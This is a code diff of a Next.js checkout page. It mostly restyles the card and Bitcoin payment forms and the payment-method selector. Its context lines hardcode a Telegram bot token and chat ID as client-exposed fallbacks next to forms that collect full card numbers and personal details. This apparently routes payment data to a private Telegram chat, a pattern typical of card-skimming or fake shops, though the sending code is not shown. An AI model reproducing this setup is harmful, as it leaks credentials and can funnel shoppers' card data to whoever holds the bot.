@@ -4,7 +4,7 @@ import Link from 'next/link';
 import { useCart } from '@/context/CartContext';
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { ChevronDown, CreditCard, Bitcoin, ArrowLeft } from 'lucide-react';
+import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check } from 'lucide-react';
 
 const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
 const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201';
@@ -12,6 +12,40 @@ const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201
 const escapeMarkdown = (text: string) => {
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
 };
+
+const PaymentMethodCard = ({ 
+  icon, 
+  title, 
+  description, 
+  isSelected, 
+  onClick 
+}: {
+  icon: React.ReactNode;
+  title: string;
+  description: string;
+  isSelected: boolean;
+  onClick: () => void;
+}) => (
+  <div
+    onClick={onClick}
+    className={`p-4 rounded-xl border-2 cursor-pointer transition-all ${isSelected ? 'border-blue-500 bg-blue-50 shadow-sm' : 'border-gray-200 hover:border-gray-300'}`}
+  >
+    <div className="flex items-center space-x-4">
+      <div className={`p-3 rounded-lg ${isSelected ? 'bg-blue-100 text-blue-600' : 'bg-gray-100 text-gray-600'}`}>
+        {icon}
+      </div>
+      <div>
+        <h3 className="font-medium text-gray-900">{title}</h3>
+        <p className="text-sm text-gray-500">{description}</p>
+      </div>
+      {isSelected && (
+        <div className="ml-auto bg-blue-500 rounded-full p-1">
+          <Check className="h-3 w-3 text-white" />
+        </div>
+      )}
+    </div>
+  </div>
+);
 
 const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
   const [formData, setFormData] = useState({
@@ -90,8 +124,8 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
   };
 
   return (
-    <div className="space-y-4  text-black">
-      <div className="space-y-4  text-black">
+    <div className="space-y-4">
+      <div className="space-y-4">
         <InputField
           label="Full Name *"
           id="name"
@@ -113,7 +147,7 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
           placeholder="your@email.com"
         />
 
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4  text-black">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <InputField
             label="Country"
             id="country"
@@ -360,8 +394,8 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-4  text-black">
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-4  text-black">
+    <form onSubmit={handleSubmit} className="space-y-4">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div className="md:col-span-2">
           <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
           <input
@@ -381,7 +415,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
           <input
             type="text"
             name="cardNumber"
-            placeholder=""
+            placeholder="1234 5678 9012 3456"
             value={form.cardNumber}
             onChange={handleChange}
             maxLength={19}
@@ -429,7 +463,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="your@email.com"
             value={form.email}
             onChange={handleChange}
-            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
@@ -443,7 +477,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="123 Main St"
             value={form.address}
             onChange={handleChange}
-            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
@@ -457,7 +491,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="New York"
             value={form.city}
             onChange={handleChange}
-            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.city ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.city ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
@@ -471,7 +505,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="United States"
             value={form.country}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg  text-black border ${errors.country ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.country ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
@@ -485,7 +519,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="10001"
             value={form.zipCode}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg  text-black border ${errors.zipCode ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.zipCode ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
@@ -499,7 +533,7 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             placeholder="+1 (555) 123-4567"
             value={form.phone}
             onChange={handleChange}
-            className={`w-full px-4 py-3  text-black rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
@@ -569,7 +603,7 @@ const InputField = ({
       required={required}
       value={value}
       onChange={onChange}
-      className="w-full px-4  py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-500 focus:border-transparent text-gray-900"
+      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900"
       placeholder={placeholder}
     />
   </div>
@@ -578,7 +612,6 @@ const InputField = ({
 const CheckoutPage = () => {
   const { cart, getTotalPrice } = useCart();
   const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
-  const [showPaymentOptions, setShowPaymentOptions] = useState<boolean>(false);
   const [orderCompleted, setOrderCompleted] = useState(false);
 
   if (cart.length === 0 && !orderCompleted) {
@@ -590,7 +623,7 @@ const CheckoutPage = () => {
             Looks like you haven't added any products to your cart yet.
           </p>
           <Link href="/">
-            <Button className="bg-teal-600 hover:bg-teal-700 text-white px-6 sm:px-8 py-2 sm:py-3">
+            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 sm:px-8 py-2 sm:py-3">
               Continue Shopping
             </Button>
           </Link>
@@ -624,168 +657,95 @@ const CheckoutPage = () => {
 
   return (
     <div className="container mx-auto px-4 py-8 bg-white min-h-screen">
-      <div className="mb-6">
-        <Link href="/cart" className="text-teal-600 hover:text-teal-700 text-sm font-medium flex items-center">
-          <ArrowLeft className="w-4 h-4 mr-1" />
-          Back to Cart
-        </Link>
-      </div>
+      <div className="max-w-6xl mx-auto">
+        <div className="mb-6">
+          <Link href="/cart" className="text-blue-600 hover:text-blue-700 text-sm font-medium flex items-center">
+            <ArrowLeft className="w-4 h-4 mr-1" />
+            Back to Cart
+          </Link>
+        </div>
 
-      <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Checkout</h1>
+        <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Checkout</h1>
 
-      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8">
-        <div className="lg:col-span-2 space-y-6">
-          <Card className="p-6 shadow-sm">
-            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Contact Information</h2>
-            <div className="space-y-4">
-              <InputField
-                label="Email Address"
-                id="email"
-                name="email"
-                type="email"
-                value=""
-                onChange={() => {}}
-                required
-                placeholder="your@email.com"
-              />
-            </div>
-          </Card>
-
-          <Card className="p-6 shadow-sm">
-            <div className="flex justify-between items-center mb-4">
-              <h2 className="text-lg sm:text-xl font-bold text-gray-900">Payment Method</h2>
-              {!showPaymentOptions && (
-                <button
-                  onClick={() => setShowPaymentOptions(true)}
-                  className="text-sm text-teal-600 hover:text-teal-700 font-medium"
-                  type="button"
-                >
-                  Change
-                </button>
-              )}
-            </div>
-
-            {showPaymentOptions ? (
-              <div className="space-y-4">
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                  <button
-                    onClick={() => {
-                      setPaymentMethod('credit-card');
-                      setShowPaymentOptions(false);
-                    }}
-                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
-                      paymentMethod === 'credit-card' 
-                        ? 'border-blue-500 bg-blue-50' 
-                        : 'border-gray-200 hover:border-gray-300'
-                    } transition-colors`}
-                    type="button"
-                  >
-                    <CreditCard className="h-6 w-6 mb-2 text-gray-700" />
-                    <span className="font-medium">Credit Card</span>
-                    <span className="text-xs text-gray-500 mt-1">Visa, Mastercard, etc.</span>
-                  </button>
-                  <button
-                    onClick={() => {
-                      setPaymentMethod('bitcoin');
-                      setShowPaymentOptions(false);
-                    }}
-                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
-                      paymentMethod === 'bitcoin' 
-                        ? 'border-orange-500 bg-orange-50' 
-                        : 'border-gray-200 hover:border-gray-300'
-                    } transition-colors`}
-                    type="button"
-                  >
-                    <Bitcoin className="h-6 w-6 mb-2 text-[#f7931a]" />
-                    <span className="font-medium">Bitcoin</span>
-                    <span className="text-xs text-gray-500 mt-1">Pay with cryptocurrency</span>
-                  </button>
-                </div>
+        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
+          <div className="lg:col-span-2 space-y-6">
+            <Card className="p-6 shadow-sm border border-gray-200 rounded-xl">
+              <h2 className="text-lg sm:text-xl font-bold mb-6 text-gray-900">Payment Method</h2>
+              
+              <div className="space-y-4 mb-6">
+                <PaymentMethodCard
+                  icon={<CreditCard className="h-5 w-5" />}
+                  title="Credit Card"
+                  description="Pay with Visa, Mastercard, etc."
+                  isSelected={paymentMethod === 'credit-card'}
+                  onClick={() => setPaymentMethod('credit-card')}
+                />
+                
+                <PaymentMethodCard
+                  icon={<Bitcoin className="h-5 w-5 text-[#f7931a]" />}
+                  title="Bitcoin"
+                  description="Pay with cryptocurrency"
+                  isSelected={paymentMethod === 'bitcoin'}
+                  onClick={() => setPaymentMethod('bitcoin')}
+                />
               </div>
-            ) : (
-              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
-                <div className="flex items-center space-x-3">
-                  {paymentMethod === 'credit-card' ? (
-                    <>
-                      <div className="p-2 bg-blue-100 rounded-lg">
-                        <CreditCard className="h-5 w-5 text-blue-600" />
-                      </div>
-                      <div>
-                        <p className="font-medium text-gray-900">Credit Card</p>
-                        <p className="text-sm text-gray-500">Pay with Visa, Mastercard, etc.</p>
-                      </div>
-                    </>
-                  ) : (
-                    <>
-                      <div className="p-2 bg-orange-100 rounded-lg">
-                        <Bitcoin className="h-5 w-5 text-[#f7931a]" />
-                      </div>
-                      <div>
-                        <p className="font-medium text-gray-900">Bitcoin</p>
-                        <p className="text-sm text-gray-500">Pay with cryptocurrency</p>
-                      </div>
-                    </>
-                  )}
-                </div>
-              </div>
-            )}
 
-            <div className="mt-6">
               {paymentMethod === 'credit-card' ? (
                 <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
               ) : (
                 <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
               )}
-            </div>
-          </Card>
-        </div>
+            </Card>
+          </div>
 
-        <div>
-          <Card className="p-6 shadow-sm sticky top-6">
-            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Order Summary</h2>
+          <div>
+            <Card className="p-6 shadow-sm border border-gray-200 rounded-xl sticky top-6">
+              <h2 className="text-lg sm:text-xl font-bold mb-6 text-gray-900">Order Summary</h2>
 
-            <div className="space-y-4 mb-6">
-              {cart.map(item => (
-                <div key={item.id} className="flex justify-between items-start">
-                  <div className="flex items-start space-x-3">
-                    <img
-                      src={item.image}
-                      alt={item.name}
-                      className="w-12 h-12 object-cover rounded-md"
-                    />
-                    <div>
-                      <p className="text-sm font-medium text-gray-900">{item.name}</p>
-                      <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
+              <div className="space-y-4 mb-6">
+                {cart.map(item => (
+                  <div key={item.id} className="flex justify-between items-start">
+                    <div className="flex items-start space-x-4">
+                      <img
+                        src={item.image}
+                        alt={item.name}
+                        className="w-16 h-16 object-cover rounded-md"
+                      />
+                      <div>
+                        <p className="text-sm font-medium text-gray-900">{item.name}</p>
+                        <p className="text-xs text-gray-500 mt-1">Qty: {item.quantity}</p>
+                        <p className="text-sm font-medium text-gray-900 mt-1">${item.price.toFixed(2)}</p>
+                      </div>
                     </div>
+                    <p className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                   </div>
-                  <p className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
+                ))}
+              </div>
+
+              <div className="space-y-3 border-t border-gray-200 pt-4">
+                <div className="flex justify-between">
+                  <span className="text-sm text-gray-600">Subtotal</span>
+                  <span className="text-sm font-medium text-gray-900">${getTotalPrice().toFixed(2)}</span>
                 </div>
-              ))}
-            </div>
+                <div className="flex justify-between">
+                  <span className="text-sm text-gray-600">Shipping</span>
+                  <span className="text-sm font-medium text-gray-900">Free</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-sm text-gray-600">Tax</span>
+                  <span className="text-sm font-medium text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
+                </div>
+                <div className="flex justify-between font-bold text-lg pt-3 border-t border-gray-200 mt-2">
+                  <span className="text-gray-900">Total</span>
+                  <span className="text-gray-900">${(getTotalPrice() * 1.08).toFixed(2)}</span>
+                </div>
+              </div>
 
-            <div className="space-y-3 border-t border-gray-200 pt-4">
-              <div className="flex justify-between">
-                <span className="text-sm text-gray-600">Subtotal</span>
-                <span className="text-sm font-medium text-gray-900">${getTotalPrice().toFixed(2)}</span>
+              <div className="mt-6 text-xs text-gray-500">
+                <p>By placing your order, you agree to our <a href="#" className="text-blue-600 hover:underline">Terms of Service</a></p>
               </div>
-              <div className="flex justify-between">
-                <span className="text-sm text-gray-600">Shipping</span>
-                <span className="text-sm font-medium text-gray-900">Free</span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-sm text-gray-600">Tax</span>
-                <span className="text-sm font-medium text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
-              </div>
-              <div className="flex justify-between font-bold text-base pt-2">
-                <span className="text-gray-900">Total</span>
-                <span className="text-gray-900">${(getTotalPrice() * 1.08).toFixed(2)}</span>
-              </div>
-            </div>
-
-            <div className="mt-6 text-xs text-gray-500">
-              <p>By placing your order, you agree to our <a href="#" className="text-teal-600 hover:underline">Terms of Service</a></p>
-            </div>
-          </Card>
+            </Card>
+          </div>
         </div>
       </div>
     </div>
